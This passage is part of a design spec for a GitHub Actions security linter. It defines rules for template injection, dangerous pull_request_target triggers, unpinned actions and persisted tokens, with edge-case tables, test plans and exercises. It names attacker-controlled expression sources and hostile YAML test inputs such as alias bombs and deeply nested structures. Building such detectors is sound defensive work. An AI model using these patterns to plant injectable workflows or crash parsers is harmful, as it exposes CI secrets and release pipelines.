- **When:** a step `uses: actions/checkout@*` without `with.persist-credentials` equal to `false` (case-insensitive, quoted or not). Severity info. Location: the step's first key. *Why it matters:* the token stays in `.git/config` for later steps and any uploaded artefact. The concept note links the "ArtiPACKED" research.

#### CRT708 `unparseable-workflow`
- All loader/builder failures in §6.2–6.3, plus `missing-local-action` (a `uses: ./x` with no `x/action.yml|yaml`) and `bad-expression`. Severity warning. `data`: `{"reason": "...", "detail": "..."}`.

### 6.6 Discovery and resolution (`discover.py`)
1. Workflows: `sorted(root.glob(".github/workflows/*.yml")) + …*.yaml`, top level only. Our `exclude` globs from the core config apply.
2. If `root/action.yml` (or `.yaml`) exists, load it as a `CompositeAction` with **no callers** (the "repo is an action" case, which matters for auditing an action repository like `ultralytics/actions`).
3. For every step `uses: ./p` (in workflows or composites): load `root/p/action.yml|yaml` once (cached by path) and record a caller edge `(caller file, job id, step index) → action`. Recurse into composite steps that themselves use `./…` (depth ≤ 5; a cycle is a CRT708 `reason="local-action-cycle"`).
4. For every job `uses: ./.github/workflows/x.yml`: record a caller edge to that workflow. Its `workflow_call` inputs get taint from the caller job's `with:`.
5. Remote `uses` are collected into `remote_actions_not_analyzed` (payload), and that's all.

### 6.7 Suppressions in YAML (`suppress.py`, `YamlSuppressionProvider`)
**Plumbing (D-046, D-051).** C7's rules return **raw** diagnostics. `api.audit_workflows` applies `core.filtering.apply_filters` **once**, passing a `YamlSuppressionProvider` built from the loaded files. It implements C3's `SuppressionProvider` protocol (`index_for(path) -> SuppressionIndex | None`) and returns `None` for paths it didn't load. CRT005 (unused suppressions) works unchanged, because the index records which entries were used.

Same syntax as [03 §5](../03-cli-config-output.md#5-suppression-comments-implemented-in-c3-honoured-by-every-python-source-command): `# cartographer: ignore[CRT705]` on the finding's line, or alone on the line directly above it. `# cartographer: ignore-file[CRT707]` within the first 20 lines. **C3's Python-only rule** (a comment-only line counts as an invalid suppression, CRT004) **does not apply to YAML**: in YAML, "alone on the line above" is valid (D-051).
Finding YAML comments correctly is the tricky part:
- A `#` starts a comment only at the start of a line or after whitespace, and only outside single/double-quoted scalars (`'it''s'` and `"a \" b"` escapes handled).
- **Lines inside block scalars (`run: |` bodies) are never comments**, because in a shell script `# cartographer: …` is part of the script. Body range of a block scalar (`style` in `literal`/`folded`): first line = `start.line + 1` (the line after the `|`/`>` indicator). Last line = `end.line - 1` **if `end.column == 1`**, else `end.line`. *Why the `- 1`:* PyYAML's end mark for a block scalar usually points at the **start of the next line** after the scalar's last content line (the trailing newline belongs to the scalar). Without this adjustment, a suppression comment on the line right after a `run: |` block would wrongly be treated as script text. T-C7-16 pins this with a suppression on exactly that line, for both `|` and `|-`/`|+` chomping, and at end of file without a trailing newline.
- **Findings inside a block scalar** (CRT702 in a `run: |` script) can't be suppressed on their own line, because that line is script. Instead, the provider maps each body line of a block scalar to the suppression entries found on the **`run:` key line** (`# cartographer: ignore[CRT702]` after the `|`, e.g. `run: |  # cartographer: ignore[CRT702]`) or alone on the line directly **above the key**. It applies to every finding in that block, and its use is recorded for CRT005.
- Invalid or unknown codes → CRT004 (reused from C3).

### 6.8 Edge cases (each one has a test)
| # | Case | Behaviour |
|---|---|---|
| E1 | `on: push` (string), `on: [push, pull_request_target]` (list), mapping | all normalise; the list form still triggers CRT701 |
| E2 | `"on":` quoted key, `true:` key | quoted `on` works. A literal key `true` is **not** treated as `on` (our loader never converts keys) |
| E3 | Expression split across a folded scalar's lines | found in `value`. Position from the raw search, or approximate |
| E4 | `${{github.head_ref}}` without spaces; `${{ github['head_ref'] }}` | both detected |
| E5 | `${{ '}}' }}`: a string literal containing `}}` | the scanner doesn't stop inside the literal |
| E6 | `if: ${{ github.head_ref == 'main' }}` | not a `run:` sink → no CRT702 (and it's a comparison anyway) |
| E7 | `env: {B: ${{ github.head_ref }}}` + `run: echo "$B"` | no finding (that's the recommended fix) |
| E8 | `run: echo ${{ env.B }}` where `env.B` = `${{ github.head_ref }}` | CRT702 (taint through `env.*` resolution) |
| E9 | `run: echo ${{ contains(github.head_ref, 'x') }}` | CLEAN (boolean) → no finding |
| E10 | `run: echo ${{ toJSON(github.event) }}` | CRT702 |
| E11 | Composite with input default `${{ github.head_ref }}` and no `with:` at the call site | taint taken from the default → CRT702 |
| E12 | Local action dir missing | CRT708 `missing-local-action` at the `uses` |
| E13 | Two workflows calling the same composite: one privileged, one `push` | one CRT702 per expression, severity error, `via` lists both callers |
| E14 | `actions/checkout@<40 hex>` with an uppercase SHA | not pinned (GitHub SHAs are lowercase; uppercase is suspicious) → CRT705 with `data.ref_kind = "sha-uppercase"` |
| E15 | `uses: docker://alpine:3.20` | CRT705. `docker://alpine@sha256:<64>` → none |
| E16 | Job-level `permissions: {}` | `kind="empty"` → no CRT706 for that job |
| E17 | Alias bomb | CRT708 `alias-expansion-limit`, and no hang (a test with a 10-second timeout) |
| E18 | File with CRLF line endings | positions identical to the LF version (the line table handles `\r\n`) |
| E19 | `# cartographer: ignore[CRT702]` written *inside* a `run: \|` script | **not** a suppression, so the finding remains |
| E20 | `.github/workflows/sub/x.yml` | ignored (GitHub ignores subdirectories) |

## 7. Diagnostics (summary; details in §6.5)
| Code | Severity | Location | Key `data` fields |
|---|---|---|---|
| CRT701 `dangerous-trigger` | error (with untrusted checkout / artefact) or warning | trigger key | `trigger`, `checks_out_untrusted`, `evidence`, `reason` |
| CRT702 `template-injection` | error (privileged), warning (unprivileged / unknown callers / strict) | the `${{` | `sources`, `taint`, `family`, `via`, `sink`, `position_approximate` |
| CRT703 `cache-in-release-job` | warning | caching input / `uses` | `job`, `action`, `input`, `value` |
| CRT704 `missing-environment-gate` | warning | job key | `job`, `signals`, `confidence` |
| CRT705 `unpinned-action` | warning | `uses` value | `uses`, `ref`, `ref_kind` |
| CRT706 `excessive-permissions` | warning | job key / `permissions` key | `job`, `case` |
| CRT707 `persisted-credentials` | info | step | `uses` |
| CRT708 `unparseable-workflow` | warning | error position (or 1:1) | `reason`, `detail` |

**Note on per-instance severity:** 03 §6 lists CRT701's default as "error/warning". For CRT701 and CRT702, the severity of each instance is computed by the rule as specified above. `[tool.cartographer.severity]` overrides, when set, replace it.

## 8. Configuration (`[tool.cartographer.ci]`)
| Key | Type | Default | Meaning |
|---|---|---|---|
| `workflows-dir` | str | `".github/workflows"` | Relative to root |
| `allow-unpinned` | list[str] | `[]` | `owner/repo` globs exempt from CRT705 (e.g. `["actions/*"]`) |
| `release-actions` | list[str] | `[]` | Extra `owner/repo` that mark a release job |
| `release-commands` | list[str] | `[]` | Extra regexes over `run:` that mark a release job |
| `cache-actions` | table[str, str] | `{}` | Extra `owner/repo = "input"` for CRT703 |
| `untrusted-dispatch-inputs` | bool | false | Treat `workflow_dispatch` inputs as attacker-controlled |
| `strict` | bool | false | Same as `--strict` |
| `max-file-kb` | int | 1024 | Larger files → CRT708 |
| `max-yaml-nodes` | int | 50000 | Alias-expansion limit |
| `max-yaml-depth` | int | 200 | Maximum nesting depth (pre-check and conversion) |

## 9. Phases & tasks

### P1: Loader, model, replica · branch `c7/model`
- [ ] **Spike S-13** (shape of the real Ultralytics workflow + composite action from public write-ups) → `docs/learn/spikes/S-13-ultralytics-shape.md`. Adjust the replica in §5.2 if the real shapes differ materially, keeping it labelled "reconstructed".
- [ ] Concept notes `github-actions-model`, `yaml-and-its-traps`.
- [ ] `yaml_loader.py` (§6.2) incl. limits, merge keys, duplicates, positions. 🖐 *Hands-on: write the test proving `yaml.safe_load("on: push")` yields `{True: 'push'}` while our loader yields the key `"on"`.*
- [ ] `model.py`, `build.py` (CRT708), `discover.py` (workflows + root `action.yml`), `rules/base.py`, CLI wiring, text/json output.
- [ ] Replica fixture files and their `README.md`.

### P2: Expressions and direct injection · branch `c7/expressions`
- [ ] Concept note `actions-expressions` (including the Pratt parser explanation and the cited attacker-controlled list).
- [ ] `expressions.py` (finder, tokenizer, parser), `contexts.py`, `taint.py` (without callers).
- [ ] CRT702 for workflow `run:` steps and `github-script`, plus `env.*` resolution.
- [ ] Hypothesis: generate random expression ASTs → render → parse → equal AST.

### P3: Composite actions, reusable workflows, dangerous triggers · branch `c7/composites`
- [ ] Local resolution and the caller graph (§6.6), input propagation, trigger-family inheritance.
- [ ] CRT701 (including artefact poisoning), CRT702 via composites/reusables, the `related` locations.

### P4: Release jobs, hygiene rules, suppressions, dogfood · branch `c7/hygiene`
- [ ] Concept note `ci-attack-patterns` (the Ultralytics chain step by step, mapped to our codes; pwn requests; cache poisoning; ArtiPACKED).
- [ ] `release.py`, CRT703–CRT707, `suppress.py`.
- [ ] SARIF output check. The §5.2 golden test.
- [ ] Add `cartographer ci .` (root `.`, D-048) to `.github/workflows/ci.yml`'s dogfood job (05 §4), with `--fail-on warning`.
- [ ] Corpus run, walkthrough, write-up, comparison.

## 10. Test plan
| ID | What | Kind |
|---|---|---|
| T-C7-01 | `on` key preserved; string/list/mapping trigger forms (E1, E2) | unit |
| T-C7-02 | Positions: 1-based line/col of keys, values and `${{` inside plain, quoted, literal and folded scalars; CRLF parity (E3, E18) | unit (parametrised) |
| T-C7-03 | Alias bomb stops at the limit within 10 s (E17); merge keys; duplicate keys; multiple documents | unit |
| T-C7-04 | Expression finder handles `}}` inside string literals and unterminated expressions (E5) | unit |
| T-C7-05 | Parser round-trip on random ASTs | Hypothesis |
| T-C7-06 | Taint table §6.4.3, one test per row (incl. E6–E10) | unit |
| T-C7-07 | Every attacker-controlled pattern is detected in a `run:` under `pull_request_target` (error) and `pull_request` (warning); none under `push` unless `--strict` | unit (generated from the pattern list) |
| T-C7-08 | **Property:** moving any tainted `${{ }}` from `run:` into `env:` and referencing it as `$VAR` removes the CRT702 finding | Hypothesis (generated workflows) |
| T-C7-09 | Composite input propagation, defaults, multiple callers, no callers, cycles, depth limit (E11–E13) | unit |
| T-C7-10 | CRT701 error/warning variants, incl. `refs/pull/` text and artefact poisoning | unit |
| T-C7-11 | Release detection: each strong signal, the medium signal, job-level permissions replacing workflow-level | unit |
| T-C7-12 | CRT703 for each cache action in the table + `ci.cache-actions` | unit |
| T-C7-13 | CRT705 pinned/unpinned/docker/uppercase SHA/allow-list (E14, E15) | unit |
| T-C7-14 | CRT706 missing vs. `write-all` vs. `{}` (E16) | unit |
| T-C7-15 | CRT707 with `false`, `'false'`, `False`, absent | unit |
| T-C7-16 | YAML suppressions: same line, line above, file-level; ignored inside block scalars (E19); the line **right after** a block scalar is a real comment (end-mark off-by-one, for `\|`, `\|-`, `\|+`, and EOF without newline); a `run:`-key-line suppression silences a CRT702 inside the block and counts as used for CRT005; invalid → CRT004; a comment-only line above a key is **not** CRT004 in YAML | unit |
| T-C7-17 | The replica produces exactly the §5.2 output | golden |
| T-C7-18 | JSON payload (§5.3) and SARIF structure | integration |
| T-C7-19 | `cartographer ci` on our own repo: 0 errors, 0 warnings | integration (dogfood) |
| T-C7-20 | Subdirectory workflows ignored (E20); root `action.yml` audited with no callers | unit |
| T-C7-21 | `cartographer ci <dir without workflows>` → WARNING log + exit 2. `cartographer ci .github` (wrong root) → the same, with the "pass the repository root" hint. `report` on the same dir has an empty CI section and doesn't fail | integration |
| T-C7-22 | Loader robustness, each mapped to CRT708 **without any exception escaping** (asserted with exit code ≠ 3): self-referencing alias `a: &x {b: *x}` (`recursive-alias`); 10 000-deep `[[[…]]]` (`too-deep`, no `RecursionError`); a NUL / `\x07` control character (`bad-character` from `ReaderError`, positioned via `position`); a scanner error with no marks | unit |
| T-C7-23 | CRT705 hint derivation: `v4`, `release/v1`, `v4.2`, `v4.2.1`, `main`, `1.2` | unit (table) |

## 11. Acceptance criteria
| ID | Criterion |
|---|---|
| A-C7-01 | The replica produces exactly the §5.2 findings: CRT702 + CRT701 (errors), CRT705 ×4, CRT704, CRT703 (warnings), CRT707 ×2 (info), at the stated positions (T-C7-17), on Windows and Ubuntu. |
| A-C7-02 | Every attacker-controlled context in §6.4.4 is detected (T-C7-07), and the `env:` fix is never flagged (T-C7-08). |
| A-C7-03 | `cartographer ci .` on this repository exits 0 with `--fail-on warning`, and the CI dogfood step is in place. |
| A-C7-04 | No input file can make the loader hang, crash or use more than 200 MB: the alias-bomb test, T-C7-22 (recursive alias, deep nesting, `ReaderError`), plus a Hypothesis fuzz of random YAML-ish text for 500 examples, where every outcome is either a successful parse or CRT708 and never an exception. |
| A-C7-05 | On at least one pinned corpus repo (S-07), `cartographer ci` reports ≥ 1 finding that the write-up confirms as a true positive. This contributes to G2. |
| A-C7-06 | The write-up runs **zizmor** on the replica and on the corpus repo and tabulates agreement/disagreement per finding. |
| A-C7-07 | `cartographer explain` texts exist for CRT701–708. |
| A-C7-08 | Docs: the 4 Stage-7 concept notes ✅, walkthrough, write-up, comparison. |
| A-C7-09 | `cartographer ci` on a directory without workflows exits 2 with the documented warning (T-C7-21); every CI invocation in this repo's docs and workflows uses root `.`. |

## 12. Documentation deliverables
- **Concept notes** (owner C7): `github-actions-model`, `yaml-and-its-traps`, `actions-expressions`, `ci-attack-patterns`. Musts:
  - `github-actions-model`: a diagram of workflow → jobs → steps → runner; what `GITHUB_TOKEN` is and its permissions; `pull_request` vs `pull_request_target` as a table (whose code, which secrets, which token).
  - `yaml-and-its-traps`: `pycon` demos of `on → True`, `no → False` (the "Norway problem"), `010` → 8 (octal in YAML 1.1), anchors, `safe_load` vs `load`.
  - `actions-expressions`: grammar, the Pratt parser walk-through on `a || b && !c`, the attacker-controlled list with citations.
  - `ci-attack-patterns`: the Ultralytics chain, mapping each step to a code (or to "not detectable statically").
- **Walkthrough** `docs/learn/walkthroughs/C7.md`: trace the replica from `discover` → `yaml_loader` (show a `YScalar` for the `run:` block with its marks) → `taint` (show the `TaintResult` for `github.head_ref || github.ref`) → rules → text.
- **Write-up** `docs/learn/writeups/C7.md`: corpus results and precision; the remote-action limitation stated plainly (§5.2 note); zizmor comparison numbers.
- **Comparison** `docs/learn/comparisons/C7.md`: zizmor's audit list (from its **user docs** before, and its **source** after acceptance, D-008). Questions: How does zizmor model expression taint? Which of its audits do we lack (for example `excessive-permissions` granularity, `ref-confusion`, `impostor-commit`, `artipacked`, `cache-poisoning`)? How does it get YAML positions? Also skim actionlint (a type checker for expressions) and poutine.

## 13. Reference implementations to compare after
| Tool | Focus | Question |
|---|---|---|
| zizmor | the main reference | How do its "confidence" and "severity" axes compare with our single severity + `data.taint`? |
| actionlint | expression type checking, shellcheck integration | Would typing expressions improve our taint precision? |
| poutine / octoscan | build-pipeline-wide scanning | What do they do with remote actions? |

## 14. Risks & open items
- **Provisional facts:** the exact attacker-controlled list, setup-go/setup-uv caching defaults, and anchor/merge-key support on GitHub. All are confirmed while writing the concept notes, with citations, and the spec is updated in the same PR.
- **S-13:** replica fidelity.
- **S-15:** whether `merge_group` runs with secrets (defaulting to privileged until confirmed).
- **R-05:** false positives in release detection (`id-token: write` used for cloud auth, not publishing) are mitigated by `data.confidence = "medium"` and the write-up's precision table.
- Remote actions are invisible (scope). The payload lists them so users know what wasn't analysed.

## 15. Exercises for the learner
1. In a scratch file run `import yaml; print(yaml.safe_load("on: push\nno: way"))`. Explain both keys. *Hint:* YAML 1.1 booleans.
2. Rewrite the replica's composite action so it's safe while still pulling the PR branch. *Hint:* `env:` + `"$HEAD_REF"`, and think about whether pulling attacker code in a privileged workflow is safe at all.
3. Find a public repository using `pull_request_target` (GitHub code search: `pull_request_target path:.github/workflows`). Run `cartographer ci` on a local clone. Is it vulnerable? *Hint:* look for checkouts of the head ref.
4. Pin one action in a workflow of your own to a SHA and add the version comment. Where do you find the SHA for a tag? *Hint:* `git ls-remote https://github.com/actions/checkout refs/tags/v4*`.
5. Draw (on paper) the expression AST for `${{ format('{0}-{1}', github.head_ref, github.sha) }}` and compute its taint by the §6.4.3 rules.
